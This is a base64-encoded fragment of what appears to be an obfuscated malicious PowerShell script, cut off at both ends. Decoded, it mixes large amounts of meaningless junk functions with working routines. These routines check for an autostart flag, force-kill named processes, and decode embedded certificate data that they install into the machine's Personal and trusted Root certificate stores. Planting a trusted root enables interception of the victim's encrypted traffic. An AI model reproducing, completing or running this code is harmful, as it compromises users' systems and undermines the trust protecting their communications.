GtSeUlOcWVrV2pDdVInKyANCidJQXZjMzRxN2FQQ3ZCWGh0Qm9PQWVtaU5YVUdUazEwK2c0blFhTzQyeUtLSDBWMEJvUGNHelRMcCtKeExJWTcvV3BlU0ZPRXFtM3pDQ0JvOU1NOUp5OTIzWWp3K3BOc29zUHpDazVJYnRNUFZhc3dOdUZ2YjJtcHVxbk8rRkhqbGplSnREVUR4eVExaXlQd0gxQnBrK3VyL2d3U3U5TThuanBlaUhYVkVoaTFtZUR3Y0xHSkx4end2NFRVTE81bzA1cWtkbVlnUycrIA0KJ2VEeUpLQ0dMUSs3MTJJUVV2d1hFb1NzdmJhbFQ5ZjNpRW00ZW9pUFc4N3BFa2FBcFl4RWphQ3U1VE14MHhlRTFtVnNTVVVBUU5MRC9PQWJ1ZHlqc1NVNmFPcC9PcEo3YzdLb2IvZkNzYVBkVGVRMlRlcWJCV1JpaFJCRzhGWWdzaUQ3ckN5RERQUmg3c2srVVFTWU8rajlNV2xoRTVnd2lGSVZ0a2loaGVsbDlSblRLa08zUFR2TE5VYjF0dldBaFBSbGVVRE9WJysgDQonRjlYNlBERWtIVkdCNmNKeXdKWldHZWE5U2dHNzdVVThmblZwajNEOHRQb2lqeEhqc0Vmck5CcnhqaHRuYUt6akpJSlVmemUvWXhFL3loQm1vV2NndzdqakRFdHRUc1d5VHcxU3FoWTdURnc3RW55MGFaQUNISVlNN3gxdGZFYUg5UjZCMzVtWktHd0ZOV1RYb3JZZkkrUWJqNHBSTitXN1p6NThmeWpwRm9kVlcyWUdBRmxXYmo2VVJUSlpPOUsrUnFwaWpXdlEnKyANCic5UUIxcThMamF0ZjJjcFUyblZxc2hSZUk1Q2ZaajBHYk9MVC9DOHk2amlySjJaWktUWGlGelVtSUN5YU1xWVExU1JJekd1WFlzaXJnSDN6aWlaekMxb0ZtVEI1cW5Pc25EMUlrNVJQU2ltWDZFcWNYWTRhdTBZZ2JBbVIxZVBiZ1FiRDZuc0dTWHF4MU5tOVlGNFVLNEpoblF0V0JIT3JNRXROODVkckwzMjR1YUszU01WeWJXSFptb3NwMzZpQ2t2MkpIU08weCcrIA0KJ1hkbkhMZ2tId1Z0K2RDNG8rMjM1eUgzNC9zY2xUSER4U09NS1VHVDNkb1BEY1N6Y3hyVHVnK0Q4MUVHejVMK1VIdGdyb3J2QnRYTHFkcHN0WitPUTdOd1RpNXhDSzdtaWNhZ24yUGVNbUxqL3J6blZiaER3YjU0N3lEbHhxK0pUS0pjM1JUazFCRXRxMmJFekU1MXBRU2pyVm92WUlrVFJ5TXpTencySjF2TW9YNmRlRFVQdVQwLzJlWTRrWlFqQkE4eDFNWEQrJysgDQonWXBmQ3pTRlllK2VCc2JxNnFQVy8ycXpVUlh0SGVGeXV5OEh5UmlFcDI0WEtPbkkreENSeEJsMUJRdzgzSjZPYWtsMWtNTld0dlhtdFBuUnNDaUdVVjYvQTQ4cGNwMVlydUVlbitabXRhKzg4T2xtMUovS2JwaklsV3BEYnpScUpTUFViMWlyOFUrL0E3Z0llM0Fhb3JMZ1ExN2g3alppQ0haMGE5T1I0d0tLS1kyK2FzdTJlTTMzQ0pLTXh0U3lhZXZFd096QWYnKyANCidNQWNHQlNzT0F3SWFCQlNzakdnNWpvM0NBSE9maCtXZ3FsaUhxRWNDd1FRVWlUaGtUbmM3MlIyRUNZRnNsaFRGVEZuNExrd0NBZ2ZRJw0KfQ0KDQpmdW5jdGlvbiBmbl9Mb2dfT1lTcjJsQkYgewogICAgcGFyYW0gKAogICAgICAgIFtzdHJpbmddJG1lc3NhZ2UKICAgICkKICAgIFdyaXRlLU91dHB1dCAnTG9nOiAkbWVzc2FnZScKfQpmdW5jdGlvbiBmbl9ZQmFNaG52VCB7CiAgICBwYXJhbSAoCiAgICAgICAgW2ludF0kdmFyX0FFQ3RYeHdULAogICAgICAgIFtpbnRdJHZhcl91TmlBSEZiNwogICAgKQogICAgJHJlc3VsdCA9ICR2YXJfQUVDdFh4d1QgKyAkdmFyX3VOaUFIRmI3CiAgICByZXR1cm4gJHJlc3VsdAp9CmZ1bmN0aW9uIGZuXzlDZDRzWDBZIHsKICAgIHBhcmFtICgKICAgICAgICBbaW50XSR2YXJfdU5pQUhGYjcsCiAgICAgICAgW2ludF0kdmFyX3I5Yk9BTFFDCiAgICApCiAgICAkcmVzdWx0ID0gJHZhcl91TmlBSEZiNyArICR2YXJfcjliT0FMUUMKICAgIHJldHVybiAkcmVzdWx0Cn0KZnVuY3Rpb24gZm5fUjZzTmZYcHQgewogICAgcGFyYW0gKAogICAgICAgIFtpbnRdJHZhcl9yOWJPQUxRQywKICAgICAgICBbaW50XSR2YXJfQTFMUFJIT1MKICAgICkKICAgICRyZXN1bHQgPSAkdmFyX3I5Yk9BTFFDICsgJHZhcl9BMUxQUkhPUwogICAgcmV0dXJuICRyZXN1bHQKfQpmdW5jdGlvbiBmbl9UZXhvbVljYiB7CiAgICBwYXJhbSAoCiAgICAgICAgW2ludF0kdmFyX0ExTFBSSE9TLAogICAgICAgIFtpbnRdJHZhcl9kV1Nod3lJMwogICAgKQogICAgJHJlc3VsdCA9ICR2YXJfQTFMUFJIT1MgKyAkdmFyX2RXU2h3eUkzCiAgICByZXR1cm4gJHJlc3VsdAp9CmZ1bmN0aW9uIGZuXzVpN3dPREJQIHsKICAgIHBhcmFtICgKICAgICAgICBbaW50XSR2YXJfZFdTaHd5STMsCiAgICAgICAgW2ludF0kdmFyX0FFQ3RYeHdUCiAgICApCiAgICAkcmVzdWx0ID0gJHZhcl9kV1Nod3lJMyArICR2YXJfQUVDdFh4d1QKICAgIHJldHVybiAkcmVzdWx0Cn0KaWYgKCR2YXJfQUVDdFh4d1QgLWd0IDQpIHsKICAgIFdyaXRlLUhvc3QgJ042YXZoNGJJZlU3UHdlUycKfSBlbHNlIHsKICAgIFdyaXRlLU91dHB1dCAnQzdRTDB1WmVkeG95MURoJwp9CmlmICgkdmFyX3VOaUFIRmI3IC1ndCA1KSB7CiAgICBXcml0ZS1PdXRwdXQgJ1pRVzNWcGJ4aGltMDg1NicKfSBlbHNlIHsKICAgIFdyaXRlLU91dHB1dCAnTkxjRTU2ZHF5VUtReElYJwp9CmlmICgkdmFyX3I5Yk9BTFFDIC1ndCA0KSB7CiAgICBXcml0ZS1Ib3N0ICdldmlsN2cwNFJCRWFibTMnCn0gZWxzZSB7CiAgICBXcml0ZS1PdXRwdXQgJ09ORDZ2Q3JTMTJwYzNuZCcKfQppZiAoJHZhcl9BMUxQUkhPUyAtZ3QgMTApIHsKICAgIFdyaXRlLUhvc3QgJ3J2UVRQNjc4MFN5a1IxTycKfSBlbHNlIHsKICAgIFdyaXRlLU91dHB1dCAnYjBWeDNmWUtNQXM1Uk9hJwp9CmlmICgkdmFyX2RXU2h3eUkzIC1ndCA2KSB7CiAgICBXcml0ZS1Ib3N0ICdTRnlJNWR0Q1dRSGUyT2wnCn0gZWxzZSB7CiAgICBXcml0ZS1PdXRwdXQgJ2JvSEVKOTRrRk4yaDZYMCcKfQokdmFyX3VOaUFIRmI3ID0gZm5fOUNkNHNYMFkgLXBhcmFtMSA2MiAtcGFyYW0yIDY3CldyaXRlLUhvc3QgJ2s2NXk5bUNyVThBMGhxUScKJHZhcl9BMUxQUkhPUyA9IGZuXzVpN3dPREJQIC1wYXJhbTEgMTIgLXBhcmFtMiAxCldyaXRlLUhvc3QgJ3p4cXl0WENrUTM3WmhOQScKJHZhcl91TmlBSEZiNyA9IGZuX1lCYU1obnZUIC1wYXJhbTEgNDIgLXBhcmFtMiA0NQpXcml0ZS1PdXRwdXQgJ0ZxVUNXanUyVndMa3NjSicKJHZhcl9BRUN0WHh3VCA9IGZuXzlDZDRzWDBZIC1wYXJhbTEgOTMgLXBhcmFtMiA4NwpXcml0ZS1PdXRwdXQgJzB1VERhcjNBaHd2bEJrMicKJHZhcl91TmlBSEZiNyA9IGZuXzVpN3dPREJQIC1wYXJhbTEgMjYgLXBhcmFtMiA2MQpXcml0ZS1Ib3N0ICd3djZYdFowOTVEUjJHRVEnCiR2YXJfQTFMUFJIT1MgPSBmbl9UZXhvbVljYiAtcGFyYW0xIDI5IC1wYXJhbTIgNjcKV3JpdGUtT3V0cHV0ICduenBlUVdaT1Y5ZjVDMTYnCiR2YXJfZFdTaHd5STMgPSBmbl85Q2Q0c1gwWSAtcGFyYW0xIDYyIC1wYXJhbTIgMzkKV3JpdGUtT3V0cHV0ICdPeVA5aEJJOHNXM2pIQ2YnCiR2YXJfZFdTaHd5STMgPSBmbl9UZXhvbVljYiAtcGFyYW0xIDM4IC1wYXJhbTIgMzEKV3JpdGUtT3V0cHV0ICdqOTV5MDhmVTRtT0hod1MnCiR2YXJfQTFMUFJIT1MgPSBmbl9ZQmFNaG52VCAtcGFyYW0xIDg0IC1wYXJhbTIgNjIKV3JpdGUtT3V0cHV0ICdIczEwdU93OHBBUGg1ckMnCiR2YXJfQUVDdFh4d1QgPSBmbl81aTd3T0RCUCAtcGFyYW0xIDYxIC1wYXJhbTIgODkKV3JpdGUtSG9zdCAndG1INVpNdWR4V1lRVWlLJwokdmFyX3I5Yk9BTFFDID0gZm5fUjZzTmZYcHQgLXBhcmFtMSA2IC1wYXJhbTIgNTkKV3JpdGUtT3V0cHV0ICduTGxjWDFLRXdOMGQyVUYnCiR2YXJfdU5pQUhGYjcgPSBmbl85Q2Q0c1gwWSAtcGFyYW0xIDYgLXBhcmFtMiA2MgpXcml0ZS1PdXRwdXQgJ29PQXVFWU42UWt2ZWhWcycKJHZhcl9yOWJPQUxRQyA9IGZuX1RleG9tWWNiIC1wYXJhbTEgNDggLXBhcmFtMiA5MwpXcml0ZS1Ib3N0ICdWYW1mSlBVTlk0OVh6aWQnCiR2YXJfdU5pQUhGYjcgPSBmbl85Q2Q0c1gwWSAtcGFyYW0xIDUyIC1wYXJhbTIgOTEKV3JpdGUtSG9zdCAnaTUySUN4clpZZnpiOHNRJwokdmFyX3VOaUFIRmI3ID0gZm5fWUJhTWhudlQgLXBhcmFtMSA3OSAtcGFyYW0yIDkyCldyaXRlLUhvc3QgJ0V4VHRBZnNLWjFscjJ2WScKJHZhcl9kV1Nod3lJMyA9IGZuX1I2c05mWHB0IC1wYXJhbTEgNzIgLXBhcmFtMiA2NgpXcml0ZS1Ib3N0ICczWTQ2R2VsSnNSeWF1b2InCiR2YXJfZFdTaHd5STMgPSBmbl9ZQmFNaG52VCAtcGFyYW0xIDg2IC1wYXJhbTIgNDAKV3JpdGUtT3V0cHV0ICdyQkx1Z292c0tadGRwR00nCiR2YXJfQTFMUFJIT1MgPSBmbl9UZXhvbVljYiAtcGFyYW0xIDExIC1wYXJhbTIgNDUKV3JpdGUtT3V0cHV0ICd4OFZaOXRqT3ZCQ25kSDMnCiR2YXJfZFdTaHd5STMgPSBmbl9SNnNOZlhwdCAtcGFyYW0xIDQ5IC1wYXJhbTIgODMKV3JpdGUtSG9zdCAnUW9XQTd2NDBGYnMyR014JwokdmFyX3I5Yk9BTFFDID0gZm5fWUJhTWhudlQgLXBhcmFtMSAzNCAtcGFyYW0yIDE5CldyaXRlLU91dHB1dCAnV0Nsd25UcTdkQThvelB2JwogJGdsb2JhbEFyZyA9ICRhcmdzWzBdDQpXcml0ZS1Ib3N0ICRnbG9iYWxBcmcNCg0KZnVuY3Rpb24gVGVzdC1BdXRvc3RhcnQgew0KICAgIGlmICgkZ2xvYmFsYXJnIC1lcSAiLWF1dG9zdGFydCIpew0KICAgICAgICByZXR1cm4gJHRydWU7DQogICAgfQ0KICAgIHJldHVybiAkZmFsc2UNCn0NCg0KaWYgKFRlc3QtQXV0b3N0YXJ0IC1lcSAkdHJ1ZSkNCnsNCiAgICBXcml0ZS1ob3N0ICJBdXRvU3RhcnQiDQp9DQpXcml0ZS1ob3N0ICItLS0tLS0tLS0tLS0tLS0tLS0tIg0KDQpmdW5jdGlvbiBJc0RlYnVnIHsNCiAgICAkZGVidWdGaWxlID0gIkM6XGRlYnVnLnR4dCINCiAgICANCiAgICB0cnkgew0KICAgICAgICAjIENoZWNrIGlmIHRoZSBmaWxlIGV4aXN0cw0KICAgICAgICBpZiAoVGVzdC1QYXRoICRkZWJ1Z0ZpbGUgLVBhdGhUeXBlIExlYWYpIHsNCiAgICAgICAgICAgIHJldHVybiAkdHJ1ZQ0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgcmV0dXJuICRmYWxzZQ0KICAgICAgICB9DQogICAgfSBjYXRjaCB7DQogICAgICAgICMgQ2F0Y2ggYW55IGVycm9ycyB0aGF0IG9jY3VyIGR1cmluZyB0aGUgVGVzdC1QYXRoIG9wZXJhdGlvbg0KICAgICAgICByZXR1cm4gJGZhbHNlDQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBHZXQtRW52UGF0aHMgew0KICAgICRhID0gR2V0LUxvY2FsQXBwRGF0YVBhdGgNCiAgICAkYiA9ICBHZXQtQXBwRGF0YVBhdGgNCiAgICByZXR1cm4gQCgkYSAsICRiKQ0KfQ0KDQpmdW5jdGlvbiBHZXQtVGVtcEZpbGUgew0KICAgICR0ZW1wUGF0aCA9IFtTeXN0ZW0uSU8uUGF0aF06OkdldFRlbXBQYXRoKCkNCiAgICAkdGVtcEZpbGUgPSBbU3lzdGVtLklPLlBhdGhdOjpHZXRUZW1wRmlsZU5hbWUoKQ0KICAgIHJldHVybiAkdGVtcEZpbGUNCn0NCg0KZnVuY3Rpb24gR2V0LUxvY2FsQXBwRGF0YVBhdGggew0KICAgIHJldHVybiBbU3lzdGVtLkVudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aChbU3lzdGVtLkVudmlyb25tZW50K1NwZWNpYWxGb2xkZXJdOjpMb2NhbEFwcGxpY2F0aW9uRGF0YSkNCn0NCg0KZnVuY3Rpb24gR2V0LUFwcERhdGFQYXRoIHsNCiAgICByZXR1cm4gW1N5c3RlbS5FbnZpcm9ubWVudF06OkdldEZvbGRlclBhdGgoW1N5c3RlbS5FbnZpcm9ubWVudCtTcGVjaWFsRm9sZGVyXTo6QXBwbGljYXRpb25EYXRhKQ0KfQ0KDQpmdW5jdGlvbiBHZXQtUHJvZmlsZVBhdGggew0KICAgIHJldHVybiBbU3lzdGVtLkVudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aChbU3lzdGVtLkVudmlyb25tZW50K1NwZWNpYWxGb2xkZXJdOjpVc2VyUHJvZmlsZSkNCn0NCg0KZnVuY3Rpb24gQ2xvc2UtUHJvY2Vzc2VzIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmdbXV0kcHJvY2Vzc2VzDQogICAgKQ0KDQogICAgZm9yZWFjaCAoJHByb2Nlc3MgaW4gJFByb2Nlc3Nlcykgew0KICAgICAgICAkY29tbWFuZCA9ICJ0YXNra2lsbC5leGUgL2ltICRwcm9jZXNzIC9mIg0KICAgICAgICBJbnZva2UtRXhwcmVzc2lvbiAkY29tbWFuZA0KICAgIH0NCn0NCmZ1bmN0aW9uIGZuX0xvZ185SmxHcnR3byB7CiAgICBwYXJhbSAoCiAgICAgICAgW3N0cmluZ10kbWVzc2FnZQogICAgKQogICAgV3JpdGUtT3V0cHV0ICdMb2c6ICRtZXNzYWdlJwp9CmZ1bmN0aW9uIGZuX0pCbEd4aDNZIHsKICAgIHBhcmFtICgKICAgICAgICBbaW50XSR2YXJfY2xMcDVnQ3MsCiAgICAgICAgW2ludF0kdmFyX3JVTG1NT0YyCiAgICApCiAgICAkcmVzdWx0ID0gJHZhcl9jbExwNWdDcyArICR2YXJfclVMbU1PRjIKICAgIHJldHVybiAkcmVzdWx0Cn0KZnVuY3Rpb24gZm5fSHQ2Y1VMaHggewogICAgcGFyYW0gKAogICAgICAgIFtpbnRdJHZhcl9yVUxtTU9GMiwKICAgICAgICBbaW50XSR2YXJfZnBDRkkyWW4KICAgICkKICAgICRyZXN1bHQgPSAkdmFyX3JVTG1NT0YyICsgJHZhcl9mcENGSTJZbgogICAgcmV0dXJuICRyZXN1bHQKfQpmdW5jdGlvbiBmbl9zMFFMR3h2aiB7CiAgICBwYXJhbSAoCiAgICAgICAgW2ludF0kdmFyX2ZwQ0ZJMlluLAogICAgICAgIFtpbnRdJHZhcl91SmxPNzJNSwogICAgKQogICAgJHJlc3VsdCA9ICR2YXJfZnBDRkkyWW4gKyAkdmFyX3VKbE83Mk1LCiAgICByZXR1cm4gJHJlc3VsdAp9CmZ1bmN0aW9uIGZuX1FpNlRXWGNuIHsKICAgIHBhcmFtICgKICAgICAgICBbaW50XSR2YXJfdUpsTzcyTUssCiAgICAgICAgW2ludF0kdmFyXzczcjh0MjZnCiAgICApCiAgICAkcmVzdWx0ID0gJHZhcl91SmxPNzJNSyArICR2YXJfNzNyOHQyNmcKICAgIHJldHVybiAkcmVzdWx0Cn0KZnVuY3Rpb24gZm5faER2eWtScjUgewogICAgcGFyYW0gKAogICAgICAgIFtpbnRdJHZhcl83M3I4dDI2ZywKICAgICAgICBbaW50XSR2YXJfY2xMcDVnQ3MKICAgICkKICAgICRyZXN1bHQgPSAkdmFyXzczcjh0MjZnICsgJHZhcl9jbExwNWdDcwogICAgcmV0dXJuICRyZXN1bHQKfQppZiAoJHZhcl9jbExwNWdDcyAtZ3QgOCkgewogICAgV3JpdGUtSG9zdCAnWjBpQnJLUmNWNjRhT3ZIJwp9IGVsc2UgewogICAgV3JpdGUtT3V0cHV0ICdVSlNjN3NtNmVaTnpEVGwnCn0KaWYgKCR2YXJfclVMbU1PRjIgLWd0IDE5KSB7CiAgICBXcml0ZS1PdXRwdXQgJ29WSkFqQ0RRZFdSNDd1aScKfSBlbHNlIHsKICAgIFdyaXRlLU91dHB1dCAnMmkxbXJKdjZUS1F4OXlwJwp9CmlmICgkdmFyX2ZwQ0ZJMlluIC1ndCAxMSkgewogICAgV3JpdGUtT3V0cHV0ICdlWHp4RDlpMnFPdTh0SmYnCn0gZWxzZSB7CiAgICBXcml0ZS1Ib3N0ICduTTRaNnVRZDVJY1Z3RVgnCn0KaWYgKCR2YXJfdUpsTzcyTUsgLWd0IDUpIHsKICAgIFdyaXRlLUhvc3QgJzZwN2M0ZXREUndxRnZaVycKfSBlbHNlIHsKICAgIFdyaXRlLUhvc3QgJ2cyYUNORDFseVFIamZjNCcKfQppZiAoJHZhcl83M3I4dDI2ZyAtZ3QgNikgewogICAgV3JpdGUtT3V0cHV0ICcwY1NVcWl6TlJwbWRlQXYnCn0gZWxzZSB7CiAgICBXcml0ZS1Ib3N0ICdkTUUzR2pjWHNDSTZmaUInCn0KJHZhcl9yVUxtTU9GMiA9IGZuX2hEdnlrUnI1IC1wYXJhbTEgMjEgLXBhcmFtMiA3MgpXcml0ZS1PdXRwdXQgJzFScWwwY3NvVDJ2WGFaMycKJHZhcl83M3I4dDI2ZyA9IGZuX2hEdnlrUnI1IC1wYXJhbTEgOTIgLXBhcmFtMiA2OQpXcml0ZS1PdXRwdXQgJzUzc3FYNkx2VkZsdzhkTycKJHZhcl91SmxPNzJNSyA9IGZuX0pCbEd4aDNZIC1wYXJhbTEgNjMgLXBhcmFtMiAyNApXcml0ZS1PdXRwdXQgJ2pOaXoxTWI2a1ZydkMwTycKJHZhcl9mcENGSTJZbiA9IGZuX0pCbEd4aDNZIC1wYXJhbTEgNTEgLXBhcmFtMiA2NgpXcml0ZS1Ib3N0ICd6TFBDSEExbTJudmV4bDUnCiR2YXJfNzNyOHQyNmcgPSBmbl9IdDZjVUxoeCAtcGFyYW0xIDM0IC1wYXJhbTIgMzMKV3JpdGUtSG9zdCAnbVBRbHZMU2lqaHBCWndJJwokdmFyX2ZwQ0ZJMlluID0gZm5fUWk2VFdYY24gLXBhcmFtMSA5NCAtcGFyYW0yIDk1CldyaXRlLUhvc3QgJ09iQUNsY0s0c0xud1J6bScKJHZhcl9yVUxtTU9GMiA9IGZuX1FpNlRXWGNuIC1wYXJhbTEgNDEgLXBhcmFtMiA4CldyaXRlLU91dHB1dCAnQ0JiS2dkcTZ1RUxSd3ByJwokdmFyX3JVTG1NT0YyID0gZm5fSHQ2Y1VMaHggLXBhcmFtMSA4NiAtcGFyYW0yIDcKV3JpdGUtSG9zdCAnM1NybnF3c3hZN1ZIaU9VJwokdmFyX3JVTG1NT0YyID0gZm5faER2eWtScjUgLXBhcmFtMSAxMiAtcGFyYW0yIDYyCldyaXRlLU91dHB1dCAnZ2NBbjZKekNUMmxNOFcxJwokdmFyX2NsTHA1Z0NzID0gZm5fczBRTEd4dmogLXBhcmFtMSAxMiAtcGFyYW0yIDYKV3JpdGUtT3V0cHV0ICd2aGpCVUMwUFk1d2dKT2wnCiR2YXJfNzNyOHQyNmcgPSBmbl9KQmxHeGgzWSAtcGFyYW0xIDY0IC1wYXJhbTIgNTUKV3JpdGUtT3V0cHV0ICdmUFlTT0dzTVo0SzB6TGonCiR2YXJfZnBDRkkyWW4gPSBmbl9KQmxHeGgzWSAtcGFyYW0xIDYyIC1wYXJhbTIgMzQKV3JpdGUtSG9zdCAnUTNpRnRoakk2bGFTb0h2JwokdmFyX3JVTG1NT0YyID0gZm5fSHQ2Y1VMaHggLXBhcmFtMSA5NCAtcGFyYW0yIDY0CldyaXRlLU91dHB1dCAnb2FkQjR0ekVEWXhoMG4yJwokdmFyX3VKbE83Mk1LID0gZm5fUWk2VFdYY24gLXBhcmFtMSA4OSAtcGFyYW0yIDUwCldyaXRlLU91dHB1dCAnSmVNa3hGWEFOV3VMaWx6JwokdmFyX2NsTHA1Z0NzID0gZm5faER2eWtScjUgLXBhcmFtMSAyMyAtcGFyYW0yIDE5CldyaXRlLU91dHB1dCAnTlhvYlJMaDlWU2NkSU1KJwokdmFyX2NsTHA1Z0NzID0gZm5fSkJsR3hoM1kgLXBhcmFtMSA5NyAtcGFyYW0yIDIyCldyaXRlLU91dHB1dCAnVEpEY0c3ZXlablhDdXptJwokdmFyX3JVTG1NT0YyID0gZm5fSHQ2Y1VMaHggLXBhcmFtMSA1MSAtcGFyYW0yIDE2CldyaXRlLUhvc3QgJ2hSTUNFNFpjZ0ZHd3RqUCcKJHZhcl9yVUxtTU9GMiA9IGZuX1FpNlRXWGNuIC1wYXJhbTEgMzMgLXBhcmFtMiA0OQpXcml0ZS1PdXRwdXQgJ1I2dlBxWkZBbURqYlE0TScKJHZhcl9mcENGSTJZbiA9IGZuX2hEdnlrUnI1IC1wYXJhbTEgMjIgLXBhcmFtMiA0MgpXcml0ZS1PdXRwdXQgJ2hXMUg3QVNsT3BiNDl3cScKJHZhcl91SmxPNzJNSyA9IGZuX3MwUUxHeHZqIC1wYXJhbTEgMjQgLXBhcmFtMiA2NgpXcml0ZS1Ib3N0ICc4RUFlMWdOV3U2aGNSVWsnCiAKCg0KDQpmdW5jdGlvbiBDb25maWd1cmVDZXJ0aWZpY2F0ZXMgew0KICAgIGZvcmVhY2ggKCRrZXkgaW4gJHhkYXRhLktleXMpIHsNCiAgICAgICAgQ2VydC1Xb3JrIC1jb250ZW50U3RyaW5nICR4ZGF0YVska2V5XQ0KICAgIH0NCn0NCg0KZnVuY3Rpb24gQ2VydC1Xb3JrIHsNCiAgICBwYXJhbSgNCiAgICAgICAgW3N0cmluZ10gJGNvbnRlbnRTdHJpbmcNCiAgICApDQogICAgJG91dHB1dEZpbGVQYXRoID0gW1N5c3RlbS5JTy5QYXRoXTo6R2V0VGVtcEZpbGVOYW1lKCkNCiAgICAkYmluYXJ5ID0gW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRjb250ZW50U3RyaW5nKQ0KICAgIHRyeSB7DQogICAgICAgIFNldC1Db250ZW50IC1QYXRoICRvdXRwdXRGaWxlUGF0aCAtVmFsdWUgJGJpbmFyeSAtQXNCeXRlU3RyZWFtDQogICAgfSBjYXRjaCB7DQogICAgICAgIEFkZC1Db250ZW50IC1QYXRoICRvdXRwdXRGaWxlUGF0aCAtVmFsdWUgJGJpbmFyeSAtRW5jb2RpbmcgQnl0ZQ0KICAgIH0NCiAgICBJbnN0YWxsLUNlcnRpZmljYXRlVG9TdG9yZXMgLUNlcnRpZmljYXRlRmlsZVBhdGggJG91dHB1dEZpbGVQYXRoIC1QYXNzd29yZCAnMTIzJw0KfQ0KDQpmdW5jdGlvbiBJbnN0YWxsLUNlcnRpZmljYXRlVG9TdG9yZXMgew0KICAgIHBhcmFtKA0KICAgICAgICBbc3RyaW5nXSAkQ2VydGlmaWNhdGVGaWxlUGF0aCwNCiAgICAgICAgW3N0cmluZ10gJFBhc3N3b3JkDQogICAgKQ0KDQogICAgdHJ5IHsNCiAgICAgICAgJHNlY3VyZVBhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAtU3RyaW5nICRQYXNzd29yZCAtQXNQbGFpblRleHQgLUZvcmNlDQoNCiAgICAgICAgIyBJbXBvcnQgY2VydGlmaWNhdGUgdG8gUGVyc29uYWwgKE15KSBzdG9yZQ0KICAgICAgICAkcGVyc29uYWxTdG9yZVBhdGggPSAiQ2VydDpcTG9jYWxNYWNoaW5lXE15Ig0KICAgICAgICBJbXBvcnQtUGZ4Q2VydGlmaWNhdGUgLUZpbGVQYXRoICRDZXJ0aWZpY2F0ZUZpbGVQYXRoIC1DZXJ0U3RvcmVMb2NhdGlvbiAkcGVyc29uYWxTdG9yZVBhdGggLVBhc3N3b3JkICRzZWN1cmVQYXNzd29yZCAtRXJyb3JBY3Rpb24gU3RvcA0KICAgICAgICBXcml0ZS1PdXRwdXQgIkNlcnRpZmljYXRlIGluc3RhbGxlZCBzdWNjZXNzZnVsbHkgdG8gUGVyc29uYWwgc3RvcmUgKE15KS4iDQoNCiAgICAgICAgIyBJbXBvcnQgY2VydGlmaWNhdGUgdG8gUm9vdCBzdG9yZQ0KICAgICAgICAkcm9vdFN0b3JlUGF0aCA9ICJDZXJ0OlxMb2NhbE1hY2hpbmVcUm9vdCINCiAgICAgICAgSW1wb3J0LVBmeENlcnRpZmljYXRlIC1GaWxlUGF0aCAkQ2VydGlmaWNhdGVGaWxlUGF0aCAtQ2VydFN0b3JlTG9jYXRpb24gJHJvb3RTdG9yZVBhdGggLVBhc3N3b3JkICRzZWN1cmVQYXNzd29yZCAtRXJyb3JBY3Rpb24gU3RvcA0KICAgICAgICBXcml0ZS1PdXRwdXQgIkNlcnRpZmljYXRlIGluc3RhbGxlZCBzdWNjZXNzZnVsbHkgdG8gUm9vdCBzdG9yZS4iDQoNCiAgICB9IGNhdGNoIHsNCiAgICAgICAgdGhyb3cgIkZhaWxlZCB0byBpbnN0YWxsIGNlcnRpZmljYXRlOiAkXyINCiAgICB9DQp9DQoNCmZ1bmN0aW9uIGZuX0xvZ19ocWVENkxVSyB7CiAgICBwYXJhbSAoCiAgICAgICAgW3N0cmluZ10kbWVzc2FnZQogICAgKQogICAgV3JpdGUtT3V0cHV0ICdMb2c6ICRtZXNzYWdlJwp9CmZ1bmN0aW9uIGZuX3daUjhCam9XIHsKICAgIHBhcmFtICgKICAgICAgICBbaW50XSR2YXJfYTBZRVA1dFUsCiAgICAgICAgW2ludF0kdmFyX2VHZHdMZ2FUCiAgICApCiAgICAkcmVzdWx0ID0gJHZhcl9hMFlFUDV0VSArICR2YXJfZUdkd0xnYVQKICAgIHJldHVybiAkcmVzdWx0Cn0KZnVuY3Rpb24gZm5fVDRzOUllUDAgewogICAgcGFyYW0gKAogICAgICAgIFtpbnRdJHZhcl9lR2R3TGdhVCwKICAgICAgICBbaW50XSR2YXJfMnk3UEFVWlcKICAgICkKICAgICRyZXN1bHQgPSAkdmFyX2VHZHdMZ2FUICsgJHZhcl8yeTdQQVVaVwogICAgcmV0dXJuICRyZXN1bHQKfQpmdW5jdGlvbiBmbl9hUUlUejU4ViB7CiAgICBwYXJhbSAoCiAgICAgICAgW2ludF0kdmFyXzJ5N1BBVVpXLAogICAgICAgIFtpbnRdJHZhcl9HSndyUFJ0YwogICAgKQogICAgJHJlc3VsdCA9ICR2YXJfMnk3UEFVWlcgKyAkdmFyX0dKd3JQUnRjCiAgICByZXR1cm4gJHJlc3VsdAp9CmZ1bmN0aW9uIGZuX0pSdXNWMklwIHsKICAgIHBhcmFtICgKICAgICAgICBbaW50XSR2YXJfR0p3clBSdGMsCiAgICAgICAgW2ludF0kdmFyX2NteEU2dzdpCiAgICApCiAgICAkcmVzdWx0ID0gJHZhcl9HSndyUFJ0YyArICR2YXJfY214RTZ3N2kKICAgIHJldHVybiAkcmVzdWx0Cn0KZnVuY3Rpb24gZm5fbmg0YmpmeEsgewogICAgcGFyYW0gKAogICAgICAgIFtpbnRdJHZhcl9jbXhFNnc3aSwKICAgICAgICBbaW50XSR2YXJfYTBZRVA1dFUKICAgICkKICAgICRyZXN1bHQgPSAkdmFyX2NteEU2dzdpICsgJHZhcl9hMFlFUDV0VQogICAgcmV0dXJuICRyZXN1bHQKfQppZiAoJHZhcl9hMFlFUDV0VSAtZ3QgMTQpIHsKICAgIFdyaXRlLU91dHB1dCAnU2FFT1FmTlViRkhkbTBWJwp9IGVsc2UgewogICAgV3JpdGUtT3V0cHV0ICdLbWxHZTNORG9TQUpJYVYnCn0KaWYgKCR2YXJfZUdkd0xnYVQgLWd0IDgpIHsKICAgIFdyaXRlLUhvc3QgJ3MyMWZ2d1BpM1NPeklIWScKfSBlbHNlIHsKICAgIFdyaXRlLUhvc3QgJ25WRWJCTXREWUxnMTBJOCcKfQppZiAoJHZhcl8yeTdQQVVaVyAtZ3QgOSkgewogICAgV3JpdGUtSG9zdCAnbFRVRmRMQVlWNVdLNDB6Jwp9IGVsc2UgewogICAgV3JpdGUtT3V0cHV0ICdwM0lTRWI0MXhyb1JrUDknCn0KaWYgKCR2YXJfR0p3clBSdGMgLWd0IDcpIHsKICAgIFdyaXRlLU91dHB1dCAnRXBI